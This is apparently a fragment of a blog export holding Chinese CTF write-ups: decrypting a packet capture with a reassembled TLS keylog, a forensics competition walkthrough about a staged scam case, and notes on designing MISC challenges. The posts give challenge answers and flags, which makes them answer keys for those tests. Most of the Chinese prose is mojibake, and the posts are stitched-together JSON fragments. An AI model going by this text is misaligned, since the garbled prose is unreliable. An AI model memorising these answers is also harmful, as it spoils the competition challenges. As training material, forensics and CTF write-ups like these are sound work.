\n\n![image-20250324202847018](http://images.lwwww.top/images/20250324202850629.png)\n\nåœ¨NetAå’Œwiresharké‡Œé¢éƒ½å¯ä»¥æ‰¾åˆ°æœ‰è¿™ä¸ªTLS.keylogçš„æ–‡ä»¶çš„åœ°æ–¹\n\n![image-20250324203915616](http://images.lwwww.top/images/20250324203917826.png)\n\nå¹¶ä¸”è¿˜èƒ½æ‰¾åˆ°è¿™ä¸ªä¿¡æ¯ Bobçš„ä¸€å¥è¯\n\nåœ¨è¿½è¸ªæµSIPæµèƒ½æ‰¾åˆ°å‡ºå¤„\n\n![image-20250324210003039](http://images.lwwww.top/images/20250324210006134.png)\n\n![image-20250324210040122](http://images.lwwww.top/images/20250324210042399.png)\n\nè¿½è¸ªå®ŒSIPæµå†çœ‹TCPæµ\n\nå¾€ä¸‹ç¿»æ‰¾![image-20250324211019039](http://images.lwwww.top/images/20250324211040128.png)\n\n![](http://images.lwwww.top/images/20250324211049316.png)\n\n![image-20250324211108854](http://images.lwwww.top/images/20250324211111045.png)\n\n![image-20250324211123567](http://images.lwwww.top/images/20250324211125199.png)\n\n```\nSERVER HANDSHAKE TRAFFIC SECRET\n9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1994da7436ac3193aff9c2ebaa3c072ea2c5b704683928e9f6e24d183e7e530386c1dcd186b9286f98249b4dc90d8b795EXPORTER SECRET\n9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c131882156a3212a425590ce171cb78068ee63e7358b587fed472d45d67ea567d98a079c84867a18665732cfobfe18f0b0\nSERVER_TRAFFIC_SECRET_0\n9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c11fbf7c07ca88c7c91be9cce4c9051f2f4bd7fb9714920661d026119ebab458db8637089348dd5a92d\nc75633bdcf43630\nCLIENT_HANDSHAKE TRAFFIC SECRET9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1a98fab3039737579a50e2b3d0bbaba7c9fcf6881d26ccf15890b06d723ba605f096dbe448cd9dcc6cf4ef5c82d187bd0\nCLIENT_TRAFFIC SECRET O9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1646306cb35d94f23e125225dc3d3c727df65b6fcec4c6cd77b6f8e2ff36d48e2b7e92e8f9188597c961866b3b667f405\n```\n\næŠŠæ•£è½çš„ç»„æˆå¹¶ä¿å­˜æˆssl.log\n\n![image-20250324212358786](http://images.lwwww.top/images/20250324212400851.png)\n\nå¯¼å…¥ï¼šç¼–è¾‘-->é¦–é€‰é¡¹-->Protocols-->TLS\n\nä½†æ˜¯é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜å°±æ˜¯keylogçš„æ ¼å¼å…¶å®æœ‰è¦æ±‚çš„ æˆ‘è‡ªå·±è°ƒè¯•äº†å¾ˆå¤šæ¬¡ç„¶åé—®äº†C3å¸ˆå‚…æ‰æˆåŠŸå¯¼å…¥è¿›å»æ­£ç¡®çš„æ ¼å¼\n\n```\nSERVER_HANDSHAKE_TRAFFIC_SECRET 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 994da7436ac3193aff9c2ebaa3c072ea2c5b704683928e9f6e24d183e7e530386c1dcd186b9286f98249b4dc90d8b795\nEXPORTER_SECRET 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 31882156a3212a425590ce171cb78068ee63e7358b587fed472d45d67ea567d98a079c84867a18665732cf0bfe18f0b0\nSERVER_TRAFFIC_SECRET_0 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 1fbf7c07ca88c7c91be9cce4c9051f2f4bd7fb9714920661d026119ebab458db8637089348dd5a92dc75633bdcf43630\nCLIENT_HANDSHAKE_TRAFFIC_SECRET 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 a98fab3039737579a50e2b3d0bbaba7c9fcf6881d26ccf15890b06d723ba605f096dbe448cd9dcc6cf4ef5c82d187bd0\nCLIENT_TRAFFIC_SECRET_0 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 646306cb35d94f23e125225dc3d3c727df65b6fcec4c6cd77b6f8e2ff36d48e2b7e92e8f9188597c961866b3b667f405\n```\n\n~~æŠŠè¿™ä¸ªä¿å­˜ä¸ºåç¼€ä¸ºlogçš„æ–‡ä»¶å°±å¯ä»¥ è¿™ä¸ªæ ¼å¼æ­£ç¡®~~\n\n![1742879091881](http://images.lwwww.top/images/20250325130509681.png)\n\n![image-20250325132155186](http://images.lwwww.top/images/20250325132157678.png)\n\næœ€åçš„æ­¥éª¤å°±å¾ˆç®€å•äº† \n\nå›¾ç‰‡å‡ºæ¥å°±æ˜¯flagäº†\n\n","tags":["-WP -MISC -CTF"]},{"title":"FICå–è¯åˆèµ›å¤ç°","url":"/2025/03/18/FICå–è¯åˆèµ›å¤ç°/","content":"\ny\n\nä¸€ä¸Šæ¥å°±é‡åˆ°é—®é¢˜äº† æƒ³è¦å¤ç°å–è¯çš„é¢˜ç›®ä¸€å®šè¦å‡†å¤‡ä¸€ä¸ªå¤§ç¡¬ç›˜ ä¿å®ˆä¼°è®¡500G+ æ‰èƒ½å¤Ÿç”¨ç„¶åéœ€è¦ä¸€ä¸ªç™¾å…†çš„ç½‘ç»œå’Œç™¾åº¦ç½‘ç›˜çš„ä¼šå‘˜ ï¼ˆä½ æ€ä¹ˆçŸ¥é“æˆ‘ç»™å­¦æ ¡æ ¡å›­ç½‘ç ´äº†ç°åœ¨æ˜¯åƒå…†ç½‘ åªä¸è¿‡ç™¾åº¦ç½‘ç›˜é™é€Ÿåˆ°ç™¾å…†ï¼‰ è¶ç€åˆšæ‰“å®Œç—›è‹¦çš„ciscnæš¨é•¿åŸæ¯ä¹‹åæˆ‘å†³å¿ƒç»§ç»­çŒ›çŒ›å­¦ä¹ ~~ä¸»è¦æ˜¯æ‰‹é‡Œé¢è¿˜æœ‰å¼˜è¿çš„ç«çœ¼æƒ³çˆ½ä¸€æŠŠå–è¯æ¢­å“ˆçš„æ„Ÿè§‰ä¸æ˜¯~~\n\nç¬¬ä¸€æ­¥å°±æ˜¯è¿™ä¸ªè¯¥æ­»çš„æŒ‚è½½ ä¸€å¼€å§‹æ‡µæ‡µçš„ä¸çŸ¥é“æ˜¯å•¥æ–‡ä»¶è¿˜å‚»ä¹ä¹é—®C3 C3è¯´ç”¨fileæŸ¥ä¸€ä¸‹ æˆ‘ç”µè„‘è¿˜æ²¡è£…wslï¼ˆæœ‰ç©ºä¸€å®šè£…å¤‡ï¼‰ç„¶åæƒ³èµ·æ¥vcäº†å°±èƒ¡ä¹±æç»“æœè¿˜çœŸæ˜¯vcç›´æ¥æŒ‚è½½äº†å¥½ç¥å¥‡\n\n![image-20250318000657244](http://images.lwwww.top/images/20250318000708033.png)![image-20250318000856181](http://images.lwwww.top/images/20250318000904026.png)\n\nç„¶åå°±æ˜¯ç†Ÿæ‚‰çš„é•œåƒæ–‡ä»¶äº†\n\n![image-20250318000941826](http://images.lwwww.top/images/20250318000943579.png)\n\n## æ‰‹æœºæ£€æ\n\n#### é¢˜ç›®æè¿°\n\n2024å¹´4æœˆï¼Œå¢æŸæŠ¥æ¡ˆè‡³è­¦æ–¹ï¼Œå£°ç§°è‡ªå·±ç–‘ä¼¼é­å—äº†â€œæ€çŒªç›˜â€è¯ˆéª—ï¼Œå¤§é‡é’±è´¢è¢«éª—èµ°ã€‚å¢æŸé€éœ²ï¼Œåœ¨ä¸æŸå…¬å¸äº¤æµè¿‡ç¨‹ä¸­ç»“è¯†äº†å‘˜å·¥ææŸã€‚ææŸç§ä¸‹è¯±å¯¼å¢æŸå‚ä¸èµŒåšæ¸¸æˆï¼Œèµ·åˆèµ„é‡‘å‡ºå…¥å‡å±æ­£å¸¸ã€‚ä½†éšåï¼ŒææŸç§°èµŒåšå¹³å°ä¸ºæå‡å®‰å…¨æ€§ï¼Œæ›´æ¢äº†åœ°å€å’Œç©æ³•ï¼Œè½¬ä¸ºé€šè¿‡ç¾¤èŠæŠ¢çº¢åŒ…å½¢å¼è¿›è¡ŒèµŒåšã€‚éšç€èµŒèµ„ä¸æ–­å¢åŠ ï¼Œå¢æŸæŠ•å…¥å·¨é¢èµ„é‡‘åï¼Œå‘ç°æ— æ³•å†è®¿é—®è¯¥ç½‘ç«™ï¼ŒåŒæ—¶ææŸä¹Ÿå¤±å»è”ç³»ï¼Œå¢æŸé‚æ„è¯†åˆ°è‡ªå·±è¢«éª—ã€‚\n åœ¨ç»æµå‹åŠ›ä¸‹ï¼Œå¢æŸé€‰æ‹©æŠ¥è­¦ï¼Œå¹¶æ‰¿è®¤å‚ä¸èµŒåšæ´»åŠ¨ï¼Œæ„¿æ„æ‰¿æ‹…ç›¸åº”æ³•å¾‹åæœã€‚è­¦æ–¹ä¾æ®å¢æŸæä¾›çš„çº¿ç´¢å’Œæ‰‹æœºæ•°æ®ï¼Œè¿…é€Ÿé”å®šçŠ¯ç½ªå›¢ä¼™ï¼Œå¹¶åœ¨ä¸€è—åŒ¿åœ°ç‚¹æˆåŠŸæŠ“è·çŠ¯ç½ªå«Œç–‘äººææŸå’ŒèµµæŸã€‚è­¦æ–¹å¯¹å«Œç–‘äººæŒæœ‰çš„ç‰©å“è¿›è¡Œäº†è¯æ®å›ºå®šï¼šææŸæ‰‹æœºè¢«æ ‡è®°ä¸ºæ£€æ1ï¼Œçªç‚¹å†…æœåŠ¡å™¨ä¸ºæ£€æ2ï¼ŒèµµæŸä½¿ç”¨çš„è®¡ç®—æœºä¸ºæ£€æ3ã€‚\n æ¥ä¸‹æ¥ï¼Œè¯·å–è¯å·¥ä½œè€…æ ¹æ®æ¡ˆæƒ…å’Œè¿™äº›æ£€æè¿›è¡Œæ·±å…¥åˆ†æï¼Œå¹¶è§£ç­”åç»­é—®é¢˜ã€‚\n\n#### æ‰‹æœºéƒ¨åˆ†1\n\nå«Œç–‘äººææŸçš„æ‰‹æœºå‹å·æ˜¯ï¼Ÿ\n\n- [ ] A. Xiaomi MI 2s\n\n- [x] B. Xiaomi MI 4\n\n- [ ] C. Xiaomi MI 6\n\n- [ ] D. Xiaomi MI 8\n\n\n![image-20250320122855362](http://images.lwwww.top/images/20250320123252241.png)\n\næ€è·¯æ˜¯å‹å·è‚¯å®šåœ¨å¾ˆå¤šé…ç½®æ–‡ä»¶é‡Œé¢å­˜åœ¨ å­˜åœ¨çš„æƒ…å†µä¸‹æˆ‘ä»¬å…¨å±€é‡Œé¢æœç´¢çœ‹çœ‹æœ‰æ²¡æœ‰æ³„éœ²å‡ºæ¥çš„ å¾ˆé¡ºåˆ©åœ¨æ–‡ä»¶å†…å®¹é‡Œé¢å°±æœç´¢å‡ºæ¥äº†\n\nä¸è¿‡æˆ‘ä¸€å¼€å§‹æ˜¯åœ¨æ–‡ä»¶é‡Œé¢çœ‹ å‘ç°æ‰¾ä¸åˆ° \n\n#### æ‰‹æœºéƒ¨åˆ†2\n\nå«Œç–‘äººææŸæ˜¯å¦å¯èƒ½æœ‰å¹³æ¿ç”µè„‘è®¾å¤‡ï¼Œå¦‚æœ‰è¯¥è®¾å¤‡å‹å·æ˜¯ï¼Ÿ\n\n- [ ] A. iPad Pro 11\n\n- [ ] B. Vivo Pad 2\n\n- [ ] C. MatePad Pro\n\n- [x] D. Xiaomi Pad 6s\n\n  ![image-20250320123244673](http://images.lwwww.top/images/20250320123256168.png)\n\n  ç›´æ¥å°±èƒ½æ‰¾åˆ°\n\n#### æ‰‹æœºéƒ¨åˆ†3\n\nå«Œç–‘äººææŸæ‰‹æœºå¼€å¯çƒ­ç‚¹è®¾ç½®çš„å¯†ç æ˜¯?\n\n![image-20250320133029069](http://images.lwwww.top/images/20250320133032864.png)\n\n`5aada11bc1b5`\n\n#### æ‰‹æœºéƒ¨åˆ†4\n\nå«Œç–‘äººææŸçš„å¾®ä¿¡å†…éƒ¨IDæ˜¯ï¼Ÿ\n\n![image-20250320133214557](http://images.lwwww.top/images/20250320133216830.png)\n\n`wxid_wnigmud8aj6j12`\n\n\n\n#### æ‰‹æœºéƒ¨åˆ†5\n\nå«Œç–‘äººææŸå‘é€ç»™æŠ€æœ¯äººå‘˜çš„ç½‘ç«™æºç ä¸‹è½½åœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ\n\nå»å¾®ä¿¡é‡Œé¢ä¸€ä¸ªä¸ªç¿»èŠå¤©è®°å½•èƒ½æ‰¾åˆ°è¿™ä¸ª\n\nç„¶åæ‰«äºŒç»´ç å¾—åˆ°æ–°ä½›æ›° è§£ç å³å¯\n\n![image-20250320133601394](http://images.lwwww.top/images/20250320133603748.png)\n\n![image-20250320134337795](http://images.lwwww.top/images/20250320200806340.png)\n\n`http://www.honglian7001.com/down`\n\n#### æ‰‹æœºéƒ¨åˆ†6\n\nç¿»èŠå¤©è®°å½•çš„æ—¶å€™å°±å·²ç»æ‰¾åˆ°äº†å—å®³äºº ä½†æ˜¯ä¸€å¼€å§‹ä»¥ä¸ºè®©æäº¤vxå·ç»“æœä¸å¯¹ ç„¶åå°±æ˜¯æäº¤å—å®³è€…çš„id\n\n![image-20250320134558224](http://images.lwwww.top/images/20250320200801748.png)\n\n`limoon890`\n\n#### æ‰‹æœºéƒ¨åˆ†7\n\nå«Œç–‘äººææŸç¬¬ä¸€æ¬¡è¿æ¥WIFIçš„æ—¶é—´æ˜¯ï¼Ÿ\n\nè¿›å»åæœç´¢wifi æœ‰ä¸€ä¸ªwificonfigçš„xmlæ–‡ä»¶\n\n- [ ] A. 03-14 15:55:57\n- [x] **B. 03-14 16:55:57**\n- [ ] C. 03-14 17:55:57\n- [ ] D. 03-14 18:55:57\n\n![image-20250320194402527](http://images.lwwww.top/images/20250320200758571.png)\n\n#### æ‰‹æœºéƒ¨åˆ†8\n\n8ã€åˆ†æå«Œç–‘äººææŸçš„ç¤¾äº¤ä¹ æƒ¯ï¼Œå“ªä¸€ä¸ªæ—¶é—´æ®µæ¶ˆæ¯æ”¶å‘æœ€æ´»è·ƒï¼Ÿ\n\n- [ ] A. 12:00-14:00\n- [ ] B. 14:00-16:00\n- [ ] C. 16:00-18:00\n- [ ] D. 18:00-20:00\n\n![image-20250320195159216](http://images.lwwww.top/images/20250320200755378.png)\n\nè¿™é¢˜çº¯ç™½ç»™\n\n#### æ‰‹æœºéƒ¨åˆ†9\n\nè¯·åˆ†æå«Œç–‘äººæ‰‹æœºï¼Œè¯¥æ¡ˆä»¶å›¢ä¼™ä¸­ï¼Œè¿˜æœ‰ä¸€åé‡è¦å‚ä¸è€…è­¦æ–¹æœªæŠ“è·ï¼Œè¯¥å«Œç–‘äººæ‰€ä½¿ç”¨çš„å¾®ä¿¡è´¦å·IDä¸ºï¼Ÿ\n\nè€è‹çš„vxid\n\n![image-20250320200355145](http://images.lwwww.top/images/20250320200750566.png)\n\n#### æ‰‹æœºéƒ¨åˆ†10\n\nè¯·åˆ†æå«Œç–‘äººæ‰‹æœºï¼Œå«Œç–‘äººè€æ¿ç»„ç»‡äººå‘˜å‚ä¸èµŒåšæ´»åŠ¨ï¼Œæ‰€ä½¿ç”¨çš„å›½å†…è®¿é—®å…¥å£åœ°å€ä¸ºï¼Ÿ[æ ¼å¼ï¼š127.0.0.1:8080/admin]\n\n![image-20250320200108582](http://images.lwwww.top/images/20250320200747555.png)\n\n\n\n## windowséƒ¨åˆ†\n\n#### window1\n\nåˆ†ææŠ€æœ¯å‘˜èµµæŸçš„windowsé•œåƒï¼Œå¹¶è®¡ç®—èµµæŸè®¡ç®—æœºçš„åŸå§‹é•œåƒçš„SHA1å€¼ä¸ºï¼Ÿ\n\n![image-20250320202251540](http://images.lwwww.top/images/20250320212549964.png)\n\n#### windows2\n\nåˆ†ææŠ€æœ¯å‘˜èµµæŸçš„windowsé•œåƒï¼Œç–‘ä¼¼VeraCryptåŠ å¯†å®¹å™¨çš„æ–‡ä»¶çš„SHA1å€¼ä¸ºï¼Ÿ\n\n```\nB25E2804B586394778C800D410ED7BCDC05A19C8\n```\n\n![image-20250325214044732](http://images.lwwww.top/images/20250325214046975.png)\n\næ‰§è¡Œç«çœ¼è€—æ—¶ä»»åŠ¡ä¸­çš„ç‰¹å¾åˆ†æå¯»æ‰¾åŠ å¯†æ–‡ä»¶ï¼Œè¯†åˆ«å¾—åˆ°åŠ å¯†å®¹å™¨2024.ifcï¼Œè®¡ç®—å…¶SHA1å€¼å³å¯ã€‚ å°±æ˜¯è¦ç­‰å¾ˆä¹…å¾ˆä¹… æ‰èƒ½æ‰¾åˆ°æ¯”è¾ƒçƒ¦äºº ä¸€å¼€å§‹æˆ‘è¿˜ä»¥ä¸ºæˆ‘çš„ç«çœ¼åæ‰äº†\n\n#### window3\n\næ®èµµæŸä¾›è¿°ï¼Œä»–ä¼šå°†å¸¸ç”¨çš„å¯†ç æ”¾ç½®åœ¨ä¸€ä¸ªæ–‡æ¡£å†…ï¼Œåˆ†ææŠ€æœ¯å‘˜èµµæŸçš„windowsé•œåƒï¼Œæ‰¾åˆ°æŠ€æœ¯å‘˜èµµæŸçš„å¯†ç å­—å…¸ï¼Œå¹¶è®¡ç®—è¯¥æ–‡ä»¶çš„SHA1å€¼?\n\n![image-20250326151729057](http://images.lwwww.top/images/20250326151731149.png)\n\n#### window4\n\næ®èµµæŸä¾›è¿°ï¼Œä»–å°†åŠ å¯†å®¹å™¨çš„å¯†ç éšå†™åœ¨ä¸€å¼ å›¾ç‰‡å†…ï¼Œéšå†™åœ¨å›¾ç‰‡ä¸­çš„å®¹å™¨å¯†ç æ˜¯ï¼Ÿ\n\n```\nqwerasdfzxcv\n```\n\n![image-20250326152330236](http://images.lwwww.top/images/20250326152332717.png)\n\nåœ¨Documentsç›®å½•ä¸‹ï¼Œæœ‰ä¸€å¼ åä¸ºpswd.jpgå›¾ç‰‡ç–‘ä¼¼å«Œç–‘äººä¾›è¿°çš„å¯†ç å›¾ç‰‡ï¼Œä½¿ç”¨è¯¥å¯†ç åŠä¸Šè¿°å®¹å™¨å‘ç°æŒ‚è½½å¤±è´¥ã€‚æŸ¥çœ‹è¯¥å›¾ç‰‡åå…­è¿›åˆ¶è¯•å›¾ï¼Œåœ¨å°¾éƒ¨æ‰¾åˆ°å¯†ç qwerasdfzxcvã€‚\n\n#### window5\n\nåˆ†ææŠ€æœ¯å‘˜èµµæŸçš„windowsé•œåƒï¼Œbitlockerçš„æ¢å¤å¯†é’¥æ˜¯ä»€ä¹ˆï¼Ÿ\n\n![image-20250326161849713](http://images.lwwww.top/images/20250326161851625.png)\n\nVCæŒ‚è½½ å¯†ç æ˜¯ç¬¬å››é¢˜æ‰¾åˆ°çš„\n\n#### window6\n\n![image-20250326162251677](http://images.lwwww.top/images/20250326162254683.png)\n\n#### window7\n\n![image-20250326182742039](http://images.lwwww.top/images/20250326182743841.png)\n\nåˆ†ææŠ€æœ¯å‘˜èµµæŸçš„windowsé•œåƒï¼Œé»˜è®¤çš„æµè§ˆå™¨æ˜¯ï¼Ÿ\n\næ˜¾è€Œæ˜“è§\n\nè¿™é‡Œéœ€è¦ä»¿çœŸä¸€ä¸‹ è¿›å»æ¯”è¾ƒå®¹æ˜“åšå‡ºæ¥\n\n#### window8\n\nåˆ†ææŠ€æœ¯å‘˜èµµæŸçš„windowsé•œåƒï¼Œç§æœ‰èŠå¤©æœåŠ¡å™¨çš„å¯†ç ä¸ºï¼š\n\n![image-20250326183052824](D:/lwwblog/source/images/202502/image-20250326183052824.png)\n\n#### window9\n\nåˆ†ææŠ€æœ¯å‘˜èµµæŸçš„windowsé•œåƒï¼Œå«Œç–‘äººè®¡ç®—æœºä¸­æœ‰ç–‘ä¼¼ä½¿ç”¨AIæŠ€æœ¯ç”Ÿæˆçš„è¿›è¡ŒèµŒåšå®£ä¼ çš„å›¾ç‰‡ï¼Œè¯¥å›¾ç‰‡ä¸­ï¼Œå®£ä¼ çš„èµŒåšç½‘ç«™åœ°å€ä¸ºï¼Ÿ\n\nä¸€ç¿»å°±æœ‰\n\n![image-20250326183746080](http://images.lwwww.top/images/20250326183748064.png)\n\n#### window10\n\nåˆ†ææŠ€æœ¯å‘˜èµµæŸçš„windowsé•œåƒï¼ŒèµµæŸä½¿ç”¨çš„AIæ¢è„¸å·¥å…·åç§°ä¸ºï¼Ÿ\n\n- [ ] A. stable diffusion\n- [x] B. ROOP\n- [ ] C. Midjourney\n- [ ] D. DiffusionDraw\n\n![image-20250326185121707](http://images.lwwww.top/images/20250326185123813.png)\n\nè¿™ä¸ªæ˜¯å¯¹ç€wpåšçš„ ä¸å¤ªç†è§£ï¼Œä½†æ˜¯ä¹Ÿå¾®å¾®èƒ½æ‡‚ å±äºå¾®è§£ğŸ˜\n\n#### window11\n\nåˆ†ææŠ€æœ¯å‘˜èµµæŸçš„Windowsé•œåƒï¼Œä½¿ç”¨AIæ¢è„¸åŠŸèƒ½ç”Ÿæˆäº†ä¸€å¼ å›¾ç‰‡ï¼Œè¯¥å›¾ç‰‡çš„åç§°ä¸ºï¼š\n\n![image-20250326185930979](D:/lwwblog/source/images/202502/image-20250326185930979.png)\n\n```\ndb.jpg\n```\n\n![image-20250326190129456](http://images.lwwww.top/images/20250326190131132.png)\n\n#### window12\n\nåˆ†ææŠ€æœ¯å‘˜èµµæŸçš„Windowsé•œåƒï¼Œaiæ¢è„¸ç”Ÿæˆå›¾ç‰‡çš„å‚æ•°ä¸­--similar-face-distanceå€¼ä¸ºï¼š\n\n![image-20250326193733008](http://images.lwwww.top/images/20250326193734830.png)\n\nä½†æ˜¯æˆ‘çš„ç«çœ¼çœŸæ²¡æ‰¾åˆ°è¿™ä¸ªåœ°æ–¹ ä¸çŸ¥é“ä¸ºä»€ä¹ˆ\n\n#### window13\n\nåˆ†ææŠ€æœ¯å‘˜èµµæŸçš„Windowsé•œåƒï¼Œå«Œç–‘äººä½¿ç”¨AIæ¢è„¸åŠŸèƒ½æ‰€ä½¿ç”¨çš„åŸå§‹å›¾ç‰‡åç§°ä¸º\n\nè·Ÿä¸Šé¢çš„è§£æ³•ä¸€æ · ä½†æ˜¯æˆ‘è¿˜æ˜¯æ‰¾ä¸åˆ°\n\n![image-20250326193856656](http://images.lwwww.top/images/20250326193857904.png)\n\n#### window14\n\nåˆ†ææŠ€æœ¯å‘˜èµµæŸçš„Windowsé•œåƒï¼ŒèµµæŸä¸ææŸæ²Ÿé€šä¸­æåˆ°çš„â€œäºŒç»´ç â€è§£å¯†æ‰€ç”¨çš„ç½‘ç«™urlåœ°å€ä¸ºï¼Ÿ \n\n![image-20250326194143209](http://images.lwwww.top/images/20250326194145803.png)\n\n```\nhttp://hi.pcmoe.net/buddha.html\n```\n\n#### window15\n\n15ã€åˆ†ææŠ€æœ¯å‘˜èµµæŸçš„Windowsé•œåƒï¼ŒèµµæŸæ¶è®¾èŠå¤©æœåŠ¡å™¨çš„åŸå§‹IPåœ°å€ä¸ºï¼Ÿ\n\n![image-20250326195226349](http://images.lwwww.top/images/20250326195228197.png)\n\n```\n192.168.8.17\n```\n\n#### window16\n\n16ã€åˆ†ææŠ€æœ¯å‘˜èµµæŸçš„Windowsé•œåƒï¼Œæ®èµµæŸäº¤ä»£ï¼Œå…¶åœ¨çªç‚¹ä¸­ç›´æ¥æ“ä½œæœåŠ¡å™¨è¿›è¡Œéƒ¨ç½²ï¼Œç¯å¢ƒæ­å»ºå¥½äº†ä¹‹åï¼Œä½¿ç”¨ä¸ªäººè®¡ç®—æœºç™»å½•èŠå¤©å®¤è¿›è¡Œæ²Ÿé€šï¼Œè¯·åˆ†æèµµæŸç¬¬ä¸€æ¬¡è®¿é—®èŠå¤©å®¤çš„æ—¶é—´ä¸ºï¼Ÿ\n\n- [ ] A. 2024-03-14 20:30:08\n- [ ] B. 2024-03-14 20:31:08\n- [x] **C. 2024-03-14 20:32:08**\n- [ ] D. 2024-03-14 20:33:08\n\n#### window17\n\nåˆ†ææŠ€æœ¯å‘˜èµµæŸçš„Windowsé•œåƒï¼Œopenwrtçš„åå°ç®¡ç†å¯†ç æ˜¯ï¼š\n\n![image-20250326195938062](D:/lwwblog/source/images/202502/image-20250326195938062.png)\n\nåœ¨è°·æ­Œæµè§ˆå™¨é‡Œé¢çš„ä¿å­˜çš„å¯†ç å¯ä»¥ç›´æ¥æ‰¾åˆ°\n\n#### window18\n\n18ã€åˆ†ææŠ€æœ¯å‘˜èµµæŸçš„Windowsé•œåƒï¼Œå«Œç–‘äººå¯èƒ½ä½¿ç”¨ä»€ä¹ˆäº‘æ¥è¿›è¡Œæ–‡ä»¶å­˜å‚¨ï¼Ÿ\n\n![image-20250326200102038](http://images.lwwww.top/images/20250326200103547.png)\n\n```\næ˜“æœ‰äº‘\n```\n\n#### window19\n\n![image-20250326200149858](http://images.lwwww.top/images/20250326200151593.png)\n\n#### window20\n\n![image-20250326200302350](http://images.lwwww.top/images/20250326200303852.png)\n\næœ€åå‡ ä¸ªåŸºæœ¬ä¸Šéƒ½åœ¨åŠ å¯†çš„æŒ‚è½½é‡Œé¢ å¾ˆå¥½æ‰¾\n","tags":["-forensics -wp"]},{"title":"Dectf MISCå‡ºé¢˜æ€è·¯","url":"/2025/03/11/MISCå‡ºé¢˜æ€è·¯/","content":"\nMISCå‡ºé¢˜æ€è·¯\n\n### 100ç®€å•ï¼š**Owidth**\n\n**å…½è¯­æˆ–è€…ä½›æ›°è¿·æƒ‘ å®åˆ™é›¶å®½éšå†™**\n\nDem0nè¯´å¥¹å¥½èƒ–ğŸ˜­ç„¶åç”©æˆ‘ä¸ªç»å…¸è¯­å½•\n\néšæ³¢é€æµè¯­å½•â€Œâ€Œâ€Œâ€Œâ€â€ï»¿ï»¿ï¼šâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€â€â€Œâ€Œâ€Œâ€Œâ€â€¬â€¬â€Œâ€Œâ€Œâ€Œâ€Œâ€â€¬â€¬â€â€Œâ€Œâ€Œâ€Œâ€â€ï»¿ï»¿â€Œâ€Œâ€Œâ€Œâ€â€Œâ€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œï»¿â€Œâ€Œâ€Œâ€Œâ€â€¬ï»¿â€â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€¬ï»¿â€¬â€Œâ€Œâ€Œâ€Œâ€â€ï»¿ï»¿â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€ï»¿â€â€æµé€é€æ³¢éšæµªæ³¢éšæ³¢éšæµªæ³¢é€æ³¢æ³¢æµªæ³¢é€æµæ³¢æ´ªæµéšéšæµªæ³¢é€æµé€æ´‹é€éšé€æµæµæµæ³¢éšæ´‹æ³¢æ³¢é€æ³¢æ³¢æµé€æ³¢æ´‹é€éšé€æ³¢é€éšéšæ³¢æ´‹æ³¢æ³¢éšæ³¢æµéšæµæµæ´‹é€éšéšéšé€é€æ³¢æ³¢â€Œâ€Œâ€Œâ€Œâ€â€\n\nflag{q1_5hi_D3m0n_bu_pwn}\n\n### \t100 **OSINT**\n\n![èŠå¤©è®°å½•](D:/lwwblog/source/images/202502/20250302112722878-1746784581033-1.png)\n\n### **![osint](D:/lwwblog/source/images/202502/20250302112729668-1746784581033-3.jpg)**\n\nflag{é½é²é©¾æ ¡}\n\n### 150**å¼€å­¦äº† è®°å¾—mmä¸è®°å¾—xh**\n\nWea5e1å¼€å­¦è¦æŠ¢è¯¾è¿«åœ¨çœ‰ç«äº†ï¼Œå¤§å­¦çš„ç¬¬äºŒä¸ªå­¦æœŸå°±åªèƒ½çœ¼ççå¾—çœ‹ç€åˆ«äººæŠŠå¥½è¯¾æŠ¢èµ°å—ï¼Œä»–ç°åœ¨åªè®°å¾—å¯†ç ä¸è®°å¾—å­¦å·äº†ï¼Œç„¶åä»–é—®å¯¼å‘˜è¦å­¦å·ï¼Œå‰‘åˆƒå¯¼å‘˜å´ç»™äº†ä¸€ä¸²è¿™ä¸ª 88bd91a429e2bf0d275e5005286d91a77ce1cefd è¿˜å‰‘å‰‘å¾—è¯´åæ­£ä½ æ˜¯æ‰“CTFçš„ï¼Œä½ è‚¯å®šéšæ‰‹å°±è§£äº†,ä½†æ˜¯å‰‘å°±å‰‘åœ¨è¿™ä¸ªå“ˆå¸Œæ˜¯ å­¦å·+2025 ~~(ä¸æ˜¯åŠ æ³•æ˜¯ä½æ•°)~~ çš„å€¼ä¸æ˜¯å­¦å·çš„å“ˆå¸Œï¼Œäºæ˜¯Wea5e1æ±‚åŠ©å¸…æ°”çš„å­¦é•¿å¤§äººLww\n\nLwwå‘Šè¯‰Wea5e1ä»–çš„[blog](http://lwwww.top)é‡Œé¢æœ‰å­¦å·çš„è§„å¾‹\n\n2024020611022025\n\nè€ƒç‚¹hashçˆ†ç ´ çˆ†ç ´å­¦å·ç»™å‡ºå­¦å·çš„è§„åˆ™ å­¦å·çš„hash\n\næç¤º1ï¼šflag{å­¦å·}\n\næç¤º2ï¼šsha1\n\nflag{202402061102}\n\n### 300ä¸­éš¾ï¼š**å˜›å˜›å˜› å˜›å˜›å˜› å˜›å˜›å˜›** \n\néŸ³é¢‘ç±»éšå†™å›¾ç‰‡  è¡¨é¢mp3 å®é™…æ˜¯wavæ–‡ä»¶ silenteyeè—å›¾ç‰‡çš„åå…­è¿›åˆ¶è¡¨é¢pngå®é™…jpg\n\nâ€‹    å›¾ç‰‡ç›²æ°´å°ç»™å‡ºæç¤º base   Z64ç è¡¨æ”¹å˜å¹¶ä¸” ç»™å‡ºflagæ 